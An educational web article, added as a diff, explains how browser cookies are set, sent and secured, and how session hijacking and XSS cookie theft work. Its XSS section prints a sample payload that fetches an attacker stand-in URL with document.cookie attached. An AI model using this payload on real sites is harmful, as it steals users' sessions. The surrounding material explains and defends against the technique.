@@ -1,0 +1,469 @@
+<div class="box warning">
+
+<strong>
+Educational Disclaimer
+</strong>
+
+<p>
+This article is intended for authorized security assessments and defensive education only. Understanding how cookies work and how they can be abused is essential for building secure web applications. HackerAI does not support or encourage unauthorized access to any system.
+</p>
+
+</div>
+
+<h2>Browser Cookies Explained: What They Do, How They Work, and How Attackers Abuse Them</h2>
+
+<p>
+Every time you log into a website, add something to a shopping cart, or see a personalized ad, a tiny text file called a <strong>browser cookie</strong> is working behind the scenes. They're one of the most fundamental technologies on the web — and also one of the most abused.
+</p>
+
+<hr>
+
+<h2>🍪 What a Browser Cookie Actually Is</h2>
+
+<p>
+A browser cookie (also called an HTTP cookie) is a small piece of data — typically a few bytes to a few kilobytes — that a web server sends to your browser and your browser stores locally. Cookies are plain text files containing key-value pairs.
+</p>
+
+<p>
+<strong>A typical cookie looks like this internally:</strong>
+</p>
+
+<div class="box job">
+<strong>Cookie Structure:</strong>
+<br><br>
+session_id=abc123xyz789; Domain=.example.com; Path=/; Expires=Tue, 17 Jul 2027 12:00:00 UTC; Secure; HttpOnly; SameSite=Lax
+</div>
+
+<p>
+Each cookie contains:
+</p>
+
+<ul>
+<li>
+<strong>Name and Value:</strong> The actual data, like <code>session_id=abc123</code>.
+</li>
+<li>
+<strong>Domain:</strong> Which website the cookie belongs to.
+</li>
+<li>
+<strong>Path:</strong> Which URL paths the cookie applies to.
+</li>
+<li>
+<strong>Expiration:</strong> When the cookie should be deleted.
+</li>
+<li>
+<strong>Flags:</strong> Security attributes like <code>Secure</code>, <code>HttpOnly</code>, and <code>SameSite</code>.
+</li>
+</ul>
+
+<hr>
+
+<h2>🌐 How a Website Creates and Stores One</h2>
+
+<p>
+The process begins when your browser makes a request to a web server.
+</p>
+
+<p>
+<strong>Step 1:</strong> You visit <code>https://example.com</code>. Your browser sends a request to the server.
+</p>
+
+<p>
+<strong>Step 2:</strong> The server responds with the webpage and includes a <code>Set-Cookie</code> header in the HTTP response:
+</p>
+
+<div class="box job">
+<strong>Server Response Header:</strong>
+<br><br>
+HTTP/2 200 OK<br>
+Content-Type: text/html<br>
+Set-Cookie: session_id=abc123xyz789; Path=/; HttpOnly; Secure; SameSite=Lax
+</div>
+
+<p>
+<strong>Step 3:</strong> Your browser reads the <code>Set-Cookie</code> header and stores the cookie in its cookie jar — a local database (usually an SQLite file) managed by the browser.
+</p>
+
+<p>
+<strong>Step 4:</strong> The cookie now lives on your machine until it expires, gets deleted, or the browser clears it.
+</p>
+
+<hr>
+
+<h2>🔁 How Cookies Are Sent Back to Websites</h2>
+
+<p>
+The magic of cookies is that the browser handles them automatically.
+</p>
+
+<p>
+<strong>Every subsequent request</strong> to the same domain that matches the cookie's path and domain attributes automatically includes the cookie in the <code>Cookie</code> request header:
+</p>
+
+<div class="box job">
+<strong>Browser Request Header:</strong>
+<br><br>
+GET /dashboard HTTP/2<br>
+Host: example.com<br>
+Cookie: session_id=abc123xyz789
+</div>
+
+<p>
+The server reads this header, looks up the session ID in its database, and knows it's you. No login prompt needed on every page.
+</p>
+
+<p>
+The browser only sends cookies back to the domain that set them. This is called the <strong>same-origin policy</strong> — and it's the foundation of cookie security. When this policy is broken, vulnerabilities happen.
+</p>
+
+<hr>
+
+<h2>🔐 Session Cookies and Login Sessions</h2>
+
+<p>
+<strong>Session cookies</strong> are the most common type. They're what keeps you logged in as you navigate a website.
+</p>
+
+<p>
+<strong>How it works:</strong>
+</p>
+
+<ul>
+<li>
+You enter your username and password on a login form.
+</li>
+<li>
+The server verifies your credentials and creates a <strong>session</strong> — a record stored server-side that says "this user is authenticated."
+</li>
+<li>
+The server sends a <strong>session ID cookie</strong> to your browser.
+</li>
+<li>
+Every subsequent request includes that session ID. The server checks it, sees you're authenticated, and serves the protected content.
+</li>
+</ul>
+
+<p>
+<strong>Session cookies can be:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Non-persistent (session-only):</strong> Deleted when you close the browser. No <code>Expires</code> or <code>Max-Age</code> attribute is set.
+</li>
+<li>
+<strong>Persistent:</strong> Survive browser restarts. Have an <code>Expires</code> or <code>Max-Age</code> attribute. Often used for "Remember Me" features.
+</li>
+</ul>
+
+<hr>
+
+<h2>📊 Tracking and Advertising Cookies</h2>
+
+<p>
+Not all cookies are for login. <strong>Third-party cookies</strong> changed the web forever — and not entirely for the better.
+</p>
+
+<p>
+<strong>How tracking works:</strong>
+</p>
+
+<ul>
+<li>
+A website loads an ad or analytics script from <code>ad-tracker.com</code>.
+</li>
+<li>
+That third-party server drops a cookie with a unique identifier in your browser.
+</li>
+<li>
+You visit another site that also loads content from <code>ad-tracker.com</code>.
+</li>
+<li>
+The browser sends the same cookie to <code>ad-tracker.com</code>.
+</li>
+<li>
+The tracker now knows you visited both Site A and Site B — and builds a profile of your browsing habits.
+</li>
+</ul>
+
+<p>
+This is how you see ads for products you searched for on completely different websites. It's why privacy regulations (GDPR, CCPA) now require cookie consent banners, and why modern browsers are phasing out third-party cookies entirely.
+</p>
+
+<hr>
+
+<h2>⚠️ What Happens When Cookies Are Stolen</h2>
+
+<p>
+A stolen cookie is essentially a stolen identity — at least temporarily. If an attacker obtains your session cookie, they can impersonate you without ever knowing your password.
+</p>
+
+<p>
+<strong>The attacker simply:</strong>
+</p>
+
+<ul>
+<li>
+Copies your session cookie value.
+</li>
+<li>
+Sets it in their own browser (using developer tools or a browser extension).
+</li>
+<li>
+Visits the same website.
+</li>
+<li>
+The server sees the valid session ID and grants them full access to your account.
+</li>
+</ul>
+
+<p>
+They can read your emails, change your password, make purchases, or exfiltrate sensitive data — all while the website believes it's you.
+</p>
+
+<hr>
+
+<h2>🕵️ Session Hijacking</h2>
+
+<p>
+<strong>Session hijacking</strong> (also called cookie hijacking or session sidejacking) is the act of stealing someone's session cookie and using it to gain unauthorized access.
+</p>
+
+<p>
+<strong>Common methods attackers use:</strong>
+</p>
+
+<ul>
+<li>
+<strong>Packet sniffing on unencrypted networks:</strong> On open Wi-Fi (coffee shops, airports), if the website uses HTTP instead of HTTPS, cookies are sent in plaintext. Anyone on the same network can capture them using tools like Wireshark.
+</li>
+<li>
+<strong>Malware:</strong> A trojan or stealer on the victim's machine can extract cookies from the browser's cookie database.
+</li>
+<li>
+<strong>Cross-Site Scripting (XSS):</strong> The most common technical method — covered in detail below.
+</li>
+<li>
+<strong>Session fixation:</strong> The attacker forces the victim to use a known session ID, then waits for them to log in.
+</li>
+</ul>
+
+<div class="box job">
+<strong>Real-World Example:</strong>
+<br><br>
+In 2015, the <strong>MobileIron</strong> session hijacking vulnerability (CVE-2015-7398) allowed attackers to steal session cookies from mobile device management consoles, granting full admin access to corporate devices.
+</div>
+
+<hr>
+
+<h2>🧪 XSS and Cookie Theft</h2>
+
+<p>
+<strong>Cross-Site Scripting (XSS)</strong> is the most well-known technique for stealing cookies. If a website has an XSS vulnerability, an attacker can inject a script that reads <code>document.cookie</code> and sends it to their server.
+</p>
+
+<p>
+<strong>The attack:</strong>
+</p>
+
+<div class="box job">
+<strong>Attacker's Payload:</strong>
+<br><br>
+&lt;script&gt;<br>
+&nbsp;&nbsp;fetch('https://attacker.example.com/steal?cookie=' + document.cookie);<br>
+&lt;/script&gt;
+</div>
+
+<p>
+When a victim views a page containing this payload (in a comment, a profile field, or a reflected search parameter), the script executes in their browser. It reads all cookies accessible to JavaScript and sends them to the attacker's server.
+</p>
+
+<p>
+<strong>Why this works:</strong> By default, JavaScript running on the same origin can access <code>document.cookie</code> — the entire cookie jar for that domain. The only defense against this is the <code>HttpOnly</code> flag.
+</p>
+
+<hr>
+
+<h2>🛡️ HttpOnly, Secure, and SameSite</h2>
+
+<p>
+These three cookie flags are the most important defenses against cookie theft. Every web developer and pentester should understand them inside out.
+</p>
+
+<h3>🔒 HttpOnly</h3>
+
+<p>
+<strong>What it does:</strong> Prevents JavaScript from accessing the cookie via <code>document.cookie</code>.
+</p>
+
+<ul>
+<li>
+Without HttpOnly: <code>document.cookie</code> returns the cookie. XSS can steal it.
+</li>
+<li>
+With HttpOnly: <code>document.cookie</code> returns nothing for that cookie. XSS cannot read it.
+</li>
+<li>
+The cookie is still sent automatically with HTTP requests — normal browser behavior is unaffected.
+</li>
+</ul>
+
+<div class="box job">
+<strong>Setting HttpOnly:</strong>
+<br><br>
+Set-Cookie: session_id=abc123; HttpOnly
+</div>
+
+<p>
+<strong>Important limitation:</strong> HttpOnly protects against cookie <em>reading</em> via XSS, but not against request forgery (CSRF). It also doesn't protect against malware that reads the browser's cookie database directly.
+</p>
+
+<h3>🔒 Secure</h3>
+
+<p>
+<strong>What it does:</strong> Tells the browser to only send the cookie over HTTPS connections.
+</p>
+
+<ul>
+<li>
+If a page is loaded over HTTP (even on an otherwise HTTPS site), the cookie is not sent.
+</li>
+<li>
+This prevents man-in-the-middle attacks where an attacker on the same network captures the cookie from an unencrypted connection.
+</li>
+</ul>
+
+<div class="box job">
+<strong>Setting Secure:</strong>
+<br><br>
+Set-Cookie: session_id=abc123; Secure
+</div>
+
+<h3>🔒 SameSite</h3>
+
+<p>
+<strong>What it does:</strong> Controls when the cookie is sent in cross-site requests. This is the most modern defense and prevents CSRF attacks along with some forms of cookie leakage.
+</p>
+
+<ul>
+<li>
+<strong>SameSite=Strict:</strong> Cookie is only sent if the request originates from the same site. Most secure, but can break legitimate cross-site navigation (like clicking a link from an email).
+</li>
+<li>
+<strong>SameSite=Lax (default in modern browsers):</strong> Cookie is sent for top-level navigations (clicking a link) but not for embedded requests (images, iframes, scripts loaded from other sites). Good balance of security and usability.
+</li>
+<li>
+<strong>SameSite=None:</strong> Cookie is sent for all cross-site requests. Requires <code>Secure</code> flag. Used for third-party integrations but opens more attack surface.
+</li>
+</ul>
+
+<div class="box job">
+<strong>Setting SameSite:</strong>
+<br><br>
+Set-Cookie: session_id=abc123; SameSite=Strict<br>
+Set-Cookie: session_id=abc123; SameSite=Lax<br>
+Set-Cookie: session_id=abc123; SameSite=None; Secure
+</div>
+
+<h3>The Ideal Session Cookie</h3>
+
+<div class="box job">
+<strong>Maximum Security Configuration:</strong>
+<br><br>
+Set-Cookie: session_id=abc123xyz789; Path=/; Expires=...; HttpOnly; Secure; SameSite=Strict
+</div>
+
+<hr>
+
+<h2>🧹 Clearing Cookies and Managing Permissions</h2>
+
+<p>
+As both a user and a security professional, knowing how to manage cookies is essential.
+</p>
+
+<h3>For Users (General Advice)</h3>
+
+<ul>
+<li>
+<strong>Clear cookies regularly:</strong> Especially after using public or shared computers. Old session cookies can sit around for months.
+</li>
+<li>
+<strong>Use browser privacy modes:</strong> Incognito/Private mode creates a temporary cookie jar that's wiped when you close the window.
+</li>
+<li>
+<strong>Review site permissions:</strong> Modern browsers let you see which sites have stored cookies and delete them individually.
+</li>
+<li>
+<strong>Use cookie blockers:</strong> Browser extensions or built-in settings can block third-party cookies entirely.
+</li>
+</ul>
+
+<h3>For Developers and Pentesters</h3>
+
+<ul>
+<li>
+<strong>Developer Tools (Application tab):</strong> In Chrome/Edge DevTools, the Application tab shows every cookie stored by the current site. You can view, edit, and delete cookies here — essential for testing session handling.
+</li>
+<li>
+<strong>Manual testing:</strong> Delete a session cookie and see if the application properly redirects you to login or exposes an error. This tests for proper session termination.
+</li>
+<li>
+<strong>Cookie manipulation:</strong> Modify cookie values in DevTools to test for improper validation. Change a session ID and see if the server catches it.
+</li>
+</ul>
+
+<div class="box job">
+<strong>Clearing Cookies in Chrome:</strong>
+<br><br>
+Settings → Privacy and Security → Clear Browsing Data →<br>
+Check "Cookies and other site data" → Clear Data
+<br><br>
+<strong>Or via DevTools:</strong>
+<br><br>
+F12 → Application → Cookies → [site] → Right-click → Clear
+</div>
+
+<hr>
+
+<h2>How To Protect Yourself</h2>
+
+<ul>
+<li>
+<strong>Use HTTPS everywhere:</strong> Ensure websites you visit use HTTPS. Browser extensions like HTTPS Everywhere can help enforce this.
+</li>
+<li>
+<strong>Log out after sessions:</strong> Especially on shared or public computers. Logging out properly destroys the session on the server side.
+</li>
+<li>
+<strong>Be cautious on public Wi-Fi:</strong> Use a VPN to encrypt all traffic if you must use open networks.
+</li>
+<li>
+<strong>Keep browsers updated:</strong> Modern browsers include increasingly sophisticated cookie protections (SameSite defaults, partitioned storage).
+</li>
+<li>
+<strong>Review cookie permissions:</strong> Periodically clear cookies you don't need and review which sites have stored data.
+</li>
+<li>
+<strong>Developers: Always set HttpOnly + Secure + SameSite on session cookies.</strong> There is almost never a reason not to.
+</li>
+</ul>
+
+<hr>
+
+<h2>Final Thoughts</h2>
+
+<p>
+Cookies are one of those technologies that seem simple on the surface — a small text file, what could go wrong? But they're the backbone of web authentication, session management, and personalization. They're also one of the most targeted attack surfaces on the web.
+</p>
+
+<p>
+Understanding how cookies work, how they're created, how they're transmitted, and how they can be stolen is essential knowledge for any web developer, security professional, or even everyday internet user.
+</p>
+
+<p>
+<strong>The key takeaways:</strong> Use HTTPS. Set <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> on every session cookie. Sanitize user input to prevent XSS. And never assume a cookie is safe just because it's stored in your browser.
+</p>
+
+<p>
+Stay informed. Stay secure. Stay protected.
+</p>
